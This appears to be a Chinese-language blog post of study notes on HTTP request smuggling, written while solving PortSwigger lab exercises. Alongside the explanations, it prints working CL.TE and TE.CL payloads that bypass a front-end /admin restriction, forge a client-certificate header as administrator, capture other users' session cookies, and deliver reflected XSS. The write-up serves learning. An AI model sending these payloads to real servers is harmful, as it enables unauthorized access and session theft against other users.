@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTTP 请求走私 | Hexo</title><meta name="author" content="xiexie"><meta name="copyright" content="xiexie"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTTP请求走私的原理HTTP 请求一个接一个地发送，接收服务器必须确定一个请求在哪里结束，下一个请求在哪里开始。需要保证前端和后端系统必须就请求之间的边界达成一致 否则，攻击者可能发送含义模糊的请求 后端会将其解释为两条不同的HTTP请求 belike使得攻击者能够在下一个合法用户的请求开头添加任意内容 在这个图片里面 也就是橙色内容 形象一点的例子前端优先处理第一个内容长度头部，后端优先处理第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP 请求走私">
+<meta property="og:url" content="http://xiexie-qiuligao.github.io/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="HTTP请求走私的原理HTTP 请求一个接一个地发送，接收服务器必须确定一个请求在哪里结束，下一个请求在哪里开始。需要保证前端和后端系统必须就请求之间的边界达成一致 否则，攻击者可能发送含义模糊的请求 后端会将其解释为两条不同的HTTP请求 belike使得攻击者能够在下一个合法用户的请求开头添加任意内容 在这个图片里面 也就是橙色内容 形象一点的例子前端优先处理第一个内容长度头部，后端优先处理第">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://xiexie-qiuligao.github.io/img/1.png">
+<meta property="article:published_time" content="2026-02-01T13:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-04T10:26:54.360Z">
+<meta property="article:author" content="xiexie">
+<meta property="article:tag" content="学习task">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://xiexie-qiuligao.github.io/img/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTTP 请求走私",
+  "url": "http://xiexie-qiuligao.github.io/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/",
+  "image": "http://xiexie-qiuligao.github.io/img/1.png",
+  "datePublished": "2026-02-01T13:00:00.000Z",
+  "dateModified": "2026-02-04T10:26:54.360Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xiexie",
+      "url": "http://xiexie-qiuligao.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="http://xiexie-qiuligao.github.io/2026/02/01/HTTP%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTTP 请求走私',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">HTTP 请求走私</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTTP 请求走私</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-01T13:00:00.000Z" title="发表于 2026-02-01 21:00:00">2026-02-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-04T10:26:54.360Z" title="更新于 2026-02-04 18:26:54">2026-02-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2026-02-04 18:26:54&quot;}" hidden></div><h3 id="HTTP请求走私的原理"><a href="#HTTP请求走私的原理" class="headerlink" title="HTTP请求走私的原理"></a>HTTP请求走私的原理</h3><p>HTTP 请求一个接一个地发送，接收服务器必须确定一个请求在哪里结束，下一个请求在哪里开始。需要保证前端和后端系统必须就请求之间的边界达成一致 否则，攻击者可能发送含义模糊的请求 后端会将其解释为两条不同的HTTP请求 belike<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/37.png"><br>使得攻击者能够在下一个合法用户的请求开头添加任意内容 在这个图片里面 也就是橙色内容 形象一点的例子<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/38.png"><br>前端优先处理第一个内容长度头部，后端优先处理第二个<br>前端会将蓝色和橙色数据转发到后端，后端在发出响应前只会读取蓝色内容<br>注入的“G”会破坏绿色用户的请求，他们可能会收到类似“未知方法 GPOST”的响应<br>前端与后端不一致 是我理解的走私的根本 上面的例子也是举的最简单的例子（现实中基本不可能存在双重内容长度技术奏效的情况）看到这里 我在想这个有点像CSRF了 毕竟可以影响到下一个用户的真正请求 继续往下面看吧</p>
+<h3 id="消息体的结束位置"><a href="#消息体的结束位置" class="headerlink" title="消息体的结束位置"></a>消息体的结束位置</h3><p>HTTP&#x2F;1 规范提供了两种不同的方式来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头 </p>
+<ol>
+<li>Content-Length 它指定邮件正文的长度 比如 一段报文 上面的就省略了<br>Content-Length: 11<br>q&#x3D;smuggling</li>
+<li>Transfer-Encoding 这个就要规范一点（也不是规范吧 总之就是感觉起来要严谨一些）指定消息体使用分块编码 每个数据块由以下部分组成：数据块大小（以字节为单位，十六进制表示）、换行符以及数据块内容 大概格式如下</li>
+</ol>
+<ul>
+<li>格式：<code>Transfer-Encoding: chunked</code></li>
+<li>块格式：<code>[chunk-size][\r\n][chunk-data][\r\n]</code></li>
+<li>结束块：<code>0[\r\n][\r\n]</code><br>接着我上面说的 感觉TE要严谨规范一点 所以如果收到的消息同时包含 Transfer-Encoding 标头字段和 Content-Length 标头字段，则必须忽略后者。</li>
+</ul>
+<h3 id="HTTP-请求走私攻击类型"><a href="#HTTP-请求走私攻击类型" class="headerlink" title="HTTP 请求走私攻击类型"></a>HTTP 请求走私攻击类型</h3><ul>
+<li>CL.TE：前端服务器使用<code>Content-Length</code>标头，后端服务器使用<code>Transfer-Encoding</code>标头。</li>
+<li>TE.CL：前端服务器使用<code>Transfer-Encoding</code>标头，后端服务器使用<code>Content-Length</code>标头。</li>
+<li>TE.TE：前端服务器和后端服务器都支持该<code>Transfer-Encoding</code>标头，但可以通过某种方式混淆该标头，使其中一个服务器不处理该标头<br>下面我都会用自己的理解打一下bp里面最基础的靶场 主要是掌握一下原理</li>
+</ul>
+<ol>
+<li>CL.TE Content-Length 设置较短 后端会因等待下一个数据块而超时 这将导致明显的延迟 那么对于这个靶场<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/40.png"><br>设置的长度是6 导致超时了 也就是说后端后端会因为等待 X 到达而超时 那么符合CL.TE 也就是说<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/41.png"><br>当我这样构造时 前端识别到G才会完 可是后端看到0\r\n\r\n之后就会以为消息已经完了 那么剩下的G 将会分在下一次请求里面 从而构造出无效的GPOST请求 如下<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/42.png"></li>
+<li>TE.CL（做完这个之后去看了信的博客…我真没剽窃）<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/43.png"><br>是的 我也是这样想的 这样子是前端全部发给后端 然后后端只能截取前三个 也就是1\r\n G就可以拼在下一个包里面 至于0 我以为这种作为结束的标志符号不会被拼接 结果哈哈<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/44.png"><br>居然也会被放进去<br>这里不知道怎么弄了 因为0作为结束的 不被后端识别的话 肯好的会被放在下一包里面啊 然后看了信的博客 发现他居然最开始payload也和我一样<br> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/45.png"><br>还能这样 中间一整个作为data 然后前端先是全部发完 然后后端只收到4位之后就停下了 等第二个包发出来之后 居然还有数据 后端测到CL为6 但是前端发的一直到结束都只有5个 只能粘上第二个包了 这里刚开始太蠢了 卡了很久 总的说来 还是最开始没有理解清楚 都没有想到通道这个概念 到处模糊地去问学长<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/46.png"></li>
+<li>TE.TE<br>找到某种头部变体，<code>Transfer-Encoding</code>使得只有前端或后端服务器中的一个会处理它，而另一个服务器则会忽略它 原理很简单了 payload给完后重点去理解一下bp里面给的教学视频</li>
+</ol>
+<h3 id="判断漏洞"><a href="#判断漏洞" class="headerlink" title="判断漏洞"></a>判断漏洞</h3><ol>
+<li>计时计数<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/49.png"></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">abc</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p>声明了分块传输（TE），但故意不发结束标志 0<br>Timeout (超时) -&gt; CL.TE： 这是最常见的情况。前端（CL）认为总共只有 6 字节，于是把全部内容发给后端 但后端（TE）认为这是分块传输，它读完了 abc 之后，一直在死等那个代表结束的 0。因为你永远没发 0，后端就一直等，直到连接超时<br>Reject (前端拒绝) -&gt; TE.CL 或 TE.TE： 如果前端本身就优先看 TE，它发现你这个分块格式不对（没有结尾），可能直接在前端就拦截并报错了<br>Response (正常响应) -&gt; CL.CL： 如果前后端都只看 CL，它们只读完 6 个字节就处理完了，所以会正常返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p><strong>Response (正常响应) -&gt; TE.TE 或 CL.CL：</strong> 如果前后端协议一致（都看 TE 或都看 CL），它们都能正常处理完这 6 个字节，不会产生错位<br><strong>Socket Poison  -&gt; CL.TE：</strong> 前端（CL）把 6 个字节（含 <code>X</code>）全发了。后端（TE）读到 <code>0\r\n\r\n</code> 就认为第一个请求完了，把剩下的 <code>X</code> 留在了缓冲区。当你发第二个包时，会发现请求变成了 <code>XPOST</code>，从而验证了 CL.TE 漏洞<br><strong>Timeout (超时) -&gt; TE.CL：</strong> 前端（TE）看到 <code>0\r\n\r\n</code>，认为请求已经结束了，所以它<strong>只转发了前 5 个字节</strong>给后端，那个 <code>X</code> 被前端丢弃或留在了前端。但后端（CL）死板地认为必须收到 6 个字节。于是后端卡住了，一直在等那个永远不会被转发过来的第 6 个字节（<code>X</code>），最终超时<br>2. 差异化响应 其实原理就和上面靶场想让我们做的事情一样 靶场让我们改变请求 其实这里转到404 底层差不多的</p>
+<ul>
+<li>CL.TE<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/51.png"><br>然后发一个get的包<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/52.png"></li>
+<li>TE.CL<br>和之前发送GPOST原理完全一样<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/53.png"><br>payload直接抄 改一下GPOST 加个404即可</li>
+</ul>
+<h3 id="HTTP走私利用"><a href="#HTTP走私利用" class="headerlink" title="HTTP走私利用"></a>HTTP走私利用</h3><ol>
+<li>利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞<br>前端服务器阻止了对&#x2F;admin的访问 需要向后端服务器发送一个请求 通过基础payload超时 判断出是CL.TE<br>那么像之前一样提前0分块</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+<p>这里加上X-Ignore: X是因为和后面第二个包的GET就两个请求了 不能处理 这时候去发第二个包 已经可以看到<br><code>HTTP/1.1 401 Unauthorized Admin interface only available to local users</code><br>那么加上Host</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+<p>这样子两个Host了 wp上面的方法<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/54.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+<p>放第二个包就可以了<br>2. 利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞<br>和上一个相差无几 也和之前的定向到&#x2F;404一样 因为前端是TE 所以不需要管两个方法影响<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/55.png"><br>3. 在许多应用中，前端服务器会在将请求转发到后端服务器之前对其进行一些重写，通常是通过添加一些额外的请求头。例如，前端服务器可能会：</p>
+<ul>
+<li>终止 TLS 连接，并添加一些描述所用协议和密码的标头；</li>
+<li>添加<code>X-Forwarded-For</code>包含用户 IP 地址的标头；</li>
+<li>根据用户的会话令牌确定用户的 ID，并添加一个标识用户的标头；或者</li>
+<li>添加一些其他攻击者感兴趣的敏感信息。<br>如果走私请求缺少前端服务器通常添加的一些标头，则后端服务器可能不会以正常方式处理请求，导致走私请求无法达到预期效果<br>CL.TE漏洞<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/56.png"><br>第二个包<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/57.png"><br>确定可以了<br>然后<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/58.png"><br>长度设置长一点<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/59.png"><br>这里可以看到前端改过之后的<code>X-*-IP</code>了<br>放在第一个包里面 用前面学的x&#x3D;来连上后面包的多余请求方式和Host</li>
+</ul>
+<ol start="4">
+<li>绕过身份验证 这个和上面很相似啦 我觉得都是不错的验证身份方法<br>验证客户端身份的组件通常会通过一个或多个非标准 HTTP 标头，将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会将包含客户端 CN 的标头附加到任何传入的请求中<br>前端服务器往往会覆盖已经存在的这些请求头。然而，走私的请求对前端完全隐藏，因此它们包含的任何请求头都会原封不动地发送到后端。<br>例如在CL.TE里面</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-SSL-CLIENT-CN: administrator</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+<p>教学里面没给TE.CL的 自己敲一个基础的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">xx</span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-SSL-CLIENT-CN: administrator</span><br><span class="line">Foo: x</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>捕获其他用户的请求<br>原理和前面得到前端重写的标头一模一样 靶场这里是CL.TE</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 256</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 400</span><br><span class="line">Cookie: session=your-session-token</span><br><span class="line"></span><br><span class="line">csrf=your-csrf-token&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=test</span><br></pre></td></tr></table></figure>
+<p>放第二个包时 能在渲染里面看到抓获的cookie 注意这里的CL长度是个技术活 短了可能得不到cookie 长了的话<br>5. HTTP 请求走私实现反射型 XSS 攻击<br>首先得找到xss地方 然后就好说了 判断漏洞 例题打的还是很通畅 CL.TE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 149</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line">User-Agent: 1&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>利用 HTTP 请求走私将站内重定向转换为开放重定向<br>简单说：<br>Apache 和 IIS 这俩服务器，默认有个规矩：<br>你访问一个文件夹的网址时，如果网址最后没加斜杠（比如输<code> http://网站地址/文件夹名</code>），服务器会自动跳转到同一个文件夹、但网址最后带斜杠的地址（也就是 <code>http://网站地址/文件夹名/</code>）。</li>
+</ol>
+<ul>
